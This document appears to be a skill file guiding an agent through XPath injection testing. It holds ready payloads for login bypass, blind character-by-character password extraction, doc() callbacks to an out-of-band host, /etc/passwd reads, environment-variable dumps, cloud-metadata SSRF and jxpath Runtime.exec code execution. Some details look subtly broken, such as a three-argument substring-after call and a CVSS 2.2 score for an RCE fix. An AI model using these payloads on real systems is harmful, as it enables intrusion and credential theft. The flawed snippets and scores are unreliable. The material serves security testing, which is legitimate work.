---
name: xpath-injection
description: XPath injection testing covering filter-injection auth bypass, blind boolean/time extraction, XPath 2.0/3.0 function abuse (doc/document/unparsed-text), XQuery superclass, and per-library parsing differentials
---

# XPath Injection

XPath injection is the class where attacker-controlled text reaches an XPath query evaluator — most often against an in-memory XML document used for authentication, authorization, or structured-document lookup — and alters the query's logical shape. The primitive is **string → XPath parser → attacker-chosen node-set**: a single unescaped `'` or `)` breaks out of a predicate and lets the attacker rewrite the predicate's truth value, enumerate the surrounding document, or (on XPath 2.0/3.0) reach into external resources via `doc()`/`document()`/`unparsed-text()`. The question is never "is XPath evaluated?" — it is "does unescaped input reach the query, and does the processor expose function-based reach?"

## Attack Surface

**Authentication Backends**
- XML-backed user stores (`users.xml` queried by `/users/user[name/text()='$u' and pass/text()='$p']`)
- SAML/XML-DSig signature verification pipelines that resolve `Signature/Reference/@URI` or `Signature/KeyInfo/X509Data/X509Certificate` via XPath (CVE-2026-9390 class)
- Legacy LDAP-to-XML mirrors in SSO integrations
- CAS and other XML-based ticket validation stores

**Document Query APIs**
- GraphQL/REST endpoints over XML-structured catalogs (feature-flag stores, config catalogs)
- Workflow/BPM engines that evaluate XPath against process-definition XML
- Content-management systems storing hierarchical trees as XML (Wikimedia EasyTimeline-class, Drupal CAS Server)
- XSLT engines that evaluate attacker-controlled `select=` expressions (route to `xslt_injection.md`)

**Developer-Facing Query DSLs**
- Expression evaluators backed by XPath (Apache HertzBeat, Spring XML config paths)
- jxpath / Jaxen / Saxon XPath APIs exposed via a search / filter endpoint
- XML batch processors with an "XPath" option (CVE-2026-82578 class)
- OpenAPI/XSD-constrained request-handlers that extract values via XPath before validation

**Input Vectors**
- Direct query parameters feeding filter position (`?user=admin`, `?filter=category/@id='X'`)
- Form fields in authentication endpoints
- SAML Response XML signed-element references and attribute-based IDs
- Nested JSON/YAML fields with an XPath string field (XML pipeline integrations)
- PAM-style modules reading identifier fields and composing them into XPath (CVE-2026-47273 class)

## Core Primitive — The Predicate-Break

Classic XPath auth-check:
```xpath
/users/user[name/text()='$username' and pass/text()='$password']
```
With `$username = admin' or '1'='1`:
```xpath
/users/user[name/text()='admin' or '1'='1' and pass/text()='$password']
```
XPath operator precedence binds `and` tighter than `or`, so the predicate collapses to:
```xpath
/users/user[name/text()='admin' or ('1'='1' and pass/text()='...')]
```
— selects all `user` nodes whose `name` is `admin`, independent of the password. If the auth code checks "any node returned" rather than "exactly one," the login succeeds. The equivalent inverse `'] | /*[name='admin` closes the predicate and selects the admin node directly via a union — defeating password check without needing an `or`.

**Payload family**:
| Payload | Effect |
|---|---|
| `' or '1'='1` | truthify the entire predicate |
| `' or 1=1 or 'a'='a` | truthify with closing quote |
| `'] | /*[1]=' ` | union with any-node for enumeration |
| `' or count(/*) >0 or 'a'='a` | boolean oracle via a wrapping count |
| `'] | //*[contains(.,'secret')] | /*[name='a` | selective extraction |

### Union, Pipe, and Node-Set Expansion

XPath's `|` (union operator) joins node-sets:
```xpath
' or '1'='1'] | //password | /*[name='
```
Where the result is reflected (not just a boolean "logged in"), the union extracts arbitrary subtrees. Common on filter/search endpoints: a search that returns match counts or formats matched nodes to JSON prints the union's content.

### Positional Enumeration

```xpath
/*[position()=1]      → first child of root
/*[position()=2]      → second
/*[last()]            → last
//text()[1]           → first text node anywhere
```
A reflected XPath where the attacker controls a numeric index enumerates the document child by child. Pair with `//name[1]`, `//name[2]`, `//name[3]` to walk a sibling list.

## Blind Extraction

When the response is a yes/no (login succeeded, filter matched one record, cache hit) rather than reflecting node content, extraction is boolean-based or time-based.

### Boolean Extraction

Primitive: craft a predicate that evaluates to true/false based on a single character of the target data.
```xpath
' and substring(/users/user[name='admin']/pass/text(),1,1)='a' or 'a'='b
```
If the first char of `admin`'s password is `a`, the predicate is true → login succeeds; else false. Enumerate character by character, position by position. The number of required requests is **character-set-size × password-length**; on a hex / printable-ASCII charset this is 95 × 32 ≈ 3000 requests per credential.

**Binary search variant** — reduces requests from O(N) per position to O(log N):
```xpath
' and substring-after(/users/user[name='admin']/pass/text(),0,1) < 'm' or 'a'='b
' and string-length(/users/user[name='admin']/pass/text()) > 10 or 'a'='b
```

### Position Enumeration via count()

```xpath
' and count(/users/user) > 100 or 'a'='b
' and count(/users/user[starts-with(name,'adm')]) > 0 or 'a'='b
```
Learn the structure of the document before extracting content. count() reveals schema; name() and local-name() enumerate element names.

### Time-Based (Rare but Observed)

Base XPath 1.0 lacks a sleep primitive. XPath 2.0+ in processors that permit `fn:collection()` or `fn:doc()` with slow URIs produces measurable delays via a hostile external resource. The time channel is more reliable via a chained SSRF primitive — route to `ssrf.md`.

## XPath 2.0 / 3.0 Function Abuse

XPath 2.0 and 3.0 (and the full XQuery superset) added functions that reach outside the current document — the attack surface balloons.

### doc() and document() — External Resource Load

```xpath
' | doc('http://xyz.oast.fun/x')//* | /*[name='a
```
Primitive: the processor fetches the attacker-chosen URI during query evaluation. Direct SSRF primitive from inside an XPath sink — route to `ssrf.md` for the egress-reach matrix.

### unparsed-text() and unparsed-text-lines() — Local File Read

```xpath
' | unparsed-text('file:///etc/passwd') | /*[name='a
```
Primitive: processor reads the file from disk and returns its contents as a text node. On XPath 3.0 processors (Saxon-HE/EE, BaseX, eXist-db) this is a local-file-read primitive if the query result is reflected. Route to `path_traversal_lfi_rfi.md` for containment framing.

### fn:environment-variable() — Env Dump

XPath 3.0 standard function:
```xpath
' | fn:environment-variable('HOME') | /*[name='a
```
Processor returns the environment variable value. Scoped to the processor's own environment — on a server with sensitive env vars (API keys, DB credentials), this is a direct extraction primitive.

### doc-available() and fn:system-property() — Fingerprint

```xpath
fn:system-property('xsl:vendor')
fn:system-property('xsl:version')
```
Processor identity — Saxon vs Xalan vs libxslt vs .NET. Fingerprinting the processor is the pre-flight for choosing escape primitives.

## Error-Based Extraction

Many processors print XPath evaluation errors with the problematic subexpression embedded. A deliberately-malformed XPath that references target data in the error message leaks data:
```xpath
' | /sub-expr-that-forces-error-with-password[/users/user[name='admin']/pass/text()] or 'a'='b
```
The thrown error carries the password text in its message string. Confirmation: a 500-shaped response includes the error body with the extracted data.

## Per-Library Differentials

Each XPath engine has distinct features and defenses. The relevant 2024–2026 behavior:

| Library | XPath version | Extension functions | External URI resolution | Common hardening |
|---|---|---|---|---|
| libxml2 (`libxml2.XPathEvaluator`) | 1.0 (default), 2.0 via extensions | no | yes via `document()` extension | `XPATH_NO_INET` option; disable `document()` |
| Java JAXP (`javax.xml.xpath`) | 1.0 | optional (via `XPathFunctionResolver`) | yes if resolver permits | `FEATURE_SECURE_PROCESSING` disables external resolution |
| Saxon (HE/PE/EE) | 2.0/3.0/3.1 | yes (Saxon-PE/EE); `ALLOW_EXTERNAL_FUNCTIONS` default varies | yes via `doc()`/`document()`/`unparsed-text()` | Saxon-HE: external functions disabled; Saxon-PE/EE: `ALLOW_EXTERNAL_FUNCTIONS=false` required |
| .NET `XPathNavigator` / `XmlDocument.SelectNodes` | 1.0 | no | not by default | Use `XsltSettings` for XSLT; XPath side is 1.0-only |
| commons-jxpath | 1.0 + jxpath extensions | yes — includes `java.lang.Runtime` reach by default | per-registered function | `assigning empty FunctionLibrary` disables jxpath functions (Convertigo CVE-2025-43955 fix) |
| Jaxen (Java) | 1.0 | optional | optional | `XPathReaderFactory` controls external access |
| Python `lxml.etree.XPath` | 1.0 (XPath), 1.0+ (ElementPath) | optional via `extensions` | `document()` disabled unless enabled | `use_global_python_log` and extensions require explicit opt-in |
| PHP `DOMXPath` | 1.0 | no | not by default | n/a — minimal attack surface |

**jxpath is the standout** — commons-jxpath includes JavaScript/Java reflection extensions that reach `java.lang.Runtime` directly from an XPath expression. The Convertigo CVE-2025-43955 (CVSS 2.2) fix is "assign an empty FunctionLibrary to JXPath contexts" — not "escape user input," but "remove the dangerous functions." If a Java app uses jxpath and does not blank the FunctionLibrary, XPath injection reaches RCE via `Runtime.exec`.

## Confirmation Primitive Ladder

| Rung | Primitive | Observed signal | What it proves |
|---|---|---|---|
| 0 | `' or '1'='1` into filter | result-set balloons from 1 → N | predicate break confirmed (XPath, SQL, or NoSQL — proceed to rung 1 to distinguish) |
| 1 | `fn:system-property('xsl:vendor')` reflected | vendor string (`Saxonica`, `Apache`, `libxml2`) | XPath confirmed; processor fingerprinted |
| 2 | `string-length(/users/user[1]/name)` reflected | integer | XPath 1.0 reach; document structure visible |
| 3 | `substring(/users/user[name='admin']/pass, 1, 10)` reflected | first 10 chars of admin pw | character-at-a-time extraction oracle |
| 4 | `doc('http://xyz.oast.fun/x')` | DNS/HTTP hit on OAST | XPath 2.0+ external URI reach (SSRF primitive) |
| 5 | `unparsed-text('file:///etc/passwd')` reflected | file contents | XPath 3.0 file-read primitive |
| 6 | `java.lang.Runtime.getRuntime().exec('id')` (jxpath only) | exec output | Direct RCE via jxpath Java-reflection |

## Detection Channels

### Reflected

The strongest signal: a filter/search endpoint that reflects matched nodes. Inject `' or '1'='1` and observe whether the result set expands dramatically — a filter that returned 3 records now returning 10,000 is an XPath injection oracle.

### Error-Message Based

Many processors emit distinctive XPath errors:
- libxml2: `XPath error : Invalid expression`
- Saxon: `net.sf.saxon.trans.XPathException: XPath syntax error`
- Java JAXP: `javax.xml.xpath.XPathExpressionException`

A `500 Internal Server Error` with any of these strings in the body is XPath-engine confirmation plus fingerprint.

### Boolean / Time

As above. Boolean is more reliable than time on local in-memory XPath. Time only works through `doc()`/`document()` on an external URI the processor fetches — this doubles as SSRF.

### OAST via doc()

```xpath
' | doc('http://xyz.oast.fun/x') | /*[name='a
```
A DNS/HTTP hit on OAST confirms `doc()` is reachable — a direct SSRF primitive from the XPath context. Route to `ssrf.md`.

## Testing Methodology

1. **Fingerprint the sink.** A filter/search field, an auth form, a SAML signature reference — each has a different payload shape. Grep source for `XPathExpression.compile`, `XPath.evaluate`, `XPathEvaluator`, `xpath.evaluate`, `lxml.etree.XPath`, `commons-jxpath` imports to locate sinks.
2. **Payload the predicate break.** `'` → observe for error. `' or '1'='1` → observe for truthification. Add `--` or `(:comment:)` if the processor supports XQuery comments.
3. **Probe for XPath 2.0/3.0.** `fn:system-property('xsl:version')` reflected returns a version string if supported; fails on strict XPath 1.0 processors. The reflected version identifies the processor family.
4. **If 2.0/3.0, test for `doc()` reach.** OAST domain → DNS hit confirms. Promote to SSRF ownership (`ssrf.md`) and file-read ownership (`path_traversal_lfi_rfi.md`) as applicable.
5. **If 1.0-only, blind-extract via boolean.** Build a one-byte-at-a-time extractor. On a confirmed yes/no channel (login succeeds/fails, filter returns N vs 0), the extraction completes in O(log N) per byte with binary search.
6. **Fingerprint the library.** Error messages, response timing on different functions, and the specific set of supported fn:* functions distinguish Saxon from Xalan from libxml2 from jxpath. Library identification routes to the per-library mitigation and escape-function set.

## Validation

A finding is XPath injection only if:
- **The predicate break works consistently.** `' or '1'='1` returning a dramatically different result set is confirmation; a single-request difference could be coincidence (session drift, caching).
- **The result set shape matches XPath semantics.** XPath predicates filter nodes; a sink that is actually SQL will show SQL-shape responses (ERROR 1064, mysql-shaped errors). An XPath sink shows node-set shapes (expanded result list, path-shaped errors).
- **The data extracted matches the document shape.** `substring()` on a non-existent node returns the empty string, not an error — a blind extraction that returns the empty string for every character is a false positive signaling the target node doesn't exist, not a successful extraction.
- **For `doc()` reach, the OAST hit arrives in the window of the request.** A hit arriving minutes later could be unrelated.

## False Positives

- **A reflected `'1'='1'` in the response body with no result-set change.** The input was echoed, not evaluated. Confirm by varying the payload — if `' or '1'='2` and `' or '1'='1` produce the same result set, there is no evaluation.
- **An error-shaped response that includes `' or '1'='1`.** Many WAFs produce canned error messages containing the input; this is not evidence of XPath evaluation.
- **A JSON response with `"query": "' or '1'='1'"`.** The query was stored or reflected but not evaluated.
- **A SQL error ("You have an error in your SQL syntax") on an XPath payload.** The sink is SQL — route to `sql_injection.md`, not here.
- **A SAML Response field reflected with no signature-verification change.** Reflections in SAML responses are common; the finding is only real if the attacker's injection *changes which element is signature-verified* (CVE-2026-9390 class).

## Impact and Chaining

**Direct impact** by scenario:
- **Auth bypass** — login as any user whose name is known; the password check is tautologically satisfied.
- **SAML signature-verification bypass** — XPath on `Signature/Reference/@URI` resolves to the wrong element; signature verifies over the attacker-controlled assertion, granting cross-user SSO impersonation (CVE-2026-9390 class).
- **Document enumeration** — read any part of the XML document the processor sees — user tables, config tables, cached credentials.
- **File read via unparsed-text()** — XPath 3.0 + reflection of query result = direct local file read.
- **SSRF via doc()/document()** — XPath 2.0/3.0 processor fetches attacker-chosen URL. Route to `ssrf.md`.
- **RCE via jxpath** — commons-jxpath's reflection functions reach `java.lang.Runtime.exec` directly from an XPath expression (CVE-2025-43955 class).

**Upstream enablers.**
- A reflected endpoint that composes an XPath string from user input without escaping. Grep targets.
- A SAML/XMLDSig library that uses XPath for reference resolution without an allowlist of allowed element paths.

**Downstream.**
- `broken_function_level_authorization.md` — authn bypass escalates to any BFLA on functions the bypassed account should not reach.
- `information_disclosure.md` — document extraction leaks structured data not covered by the usual DB/API controls.
- `ssrf.md` and `path_traversal_lfi_rfi.md` — XPath 2.0/3.0 function abuse pivots.
- `xslt_injection.md` — any XSLT engine that evaluates attacker-controlled `select=` reaches the full XSLT extension-function surface, strictly more primitives than XPath alone.

**Composite chains.**
- *XPath auth-bypass → BFLA → data exfil.* Bypass to admin → admin-only endpoint → extract data not exposed to normal users.
- *XPath → doc() SSRF → cloud metadata.* XPath 2.0+ `doc('http://169.254.169.254/latest/meta-data/')` reaches metadata via the XPath processor's URI fetch; route cloud-identity usage to `cloud/*`.
- *XPath → jxpath → Runtime.exec.* Direct RCE where jxpath functions are not blanked.

## Pro Tips

- **Operator precedence matters.** `and` binds tighter than `or`; `/user[a and b or c]` is `/user[(a and b) or c]`. Craft payloads with this in mind — a leading `or` short-circuits all the `and` conditions after it.
- **The library name is in the error message.** A single 500 response often prints Saxon vs libxml2 vs JAXP — fingerprint before firing XPath 3.0 primitives on a 1.0-only engine.
- **jxpath reaches Runtime unless the FunctionLibrary is blanked.** The Convertigo CVE-2025-43955 fix is instructive: the vulnerability is not in user input, it is in jxpath's default function set. On any Java app using jxpath, the finding is "jxpath functions enabled" independent of input validation.
- **SAML XPath is a privilege-escalation path, not a parse bug.** CVE-2026-9390 (XML::Sig) is XPath injection in signature-reference resolution — the attacker makes the signature verify over the wrong element. Route to `authentication_jwt.md` for the token-vs-ID distinction; the mechanism is XPath here.
- **Binary search beats byte-by-byte.** Blind XPath extraction scales to multi-byte passwords only if the enumeration is log-N per byte.
- **doc() is SSRF.** Treat any XPath 2.0+ reach as a dual-channel finding (XPath + SSRF). The novel sibling owns the specific primary-source anchors.

## Tooling

- **Burp Suite** — Scanner's XPath-injection probes handle the classic `' or '1'='1` family. Burp Collaborator captures `doc()` OAST hits.
- **xpath-injector / xcat** — automated blind-XPath extraction; handles the character-at-a-time enumeration.
- **SOAP UI / Postman** — manual payload crafting into XML request bodies.
- **Saxon command line** (`java -jar Saxon-HE.jar -s:doc.xml -q:'...'`) — reproduce a payload locally to understand the processor's exact behavior before firing against the target.
- **lxml / python-xml** — Python shell for crafting and testing XPath against known-good XML.

## Summary

XPath injection breaks a predicate's logical shape with a single unescaped quote, truthifying auth checks, expanding filter result-sets, or redirecting SAML signature-verification references. XPath 1.0 is bounded to in-document primitives; XPath 2.0/3.0 adds `doc()`/`document()`/`unparsed-text()`/`fn:environment-variable()` for external-resource reach, duplicating with SSRF and local file-read as pivot classes. The 2024–2026 frontier is denser than the "mature class" framing suggests — Juniper J-Web (CVE-2024-39565, CVSS 8.8), Apache HertzBeat (CVE-2026-24343), Plesk APS Catalog (CVE-2026-44962, CVSS 9.9), XML::Sig SAML XPath (CVE-2026-9390, CVSS 9.1), Wikimedia Mediawiki EasyTimeline (CVE-2026-103044, CVSS 9.8), pam_usb (CVE-2026-47273), Smolagents (CVE-2025-11844), and Convertigo jxpath (CVE-2025-43955) each anchor an active mechanism class. The two deep siblings carry the full technique surface: `xpath_injection_advanced_deep.md` owns per-library parsing differentials, XQuery superset, error-based extraction, and blind confirmation discipline; `xpath_injection_novel_deep.md` owns the 2024–2026 CVE catalog with the SAML signature-reference primitive class, the jxpath Runtime-reach primitive, and the auth-via-XPath-to-RCE chain in J-Web.
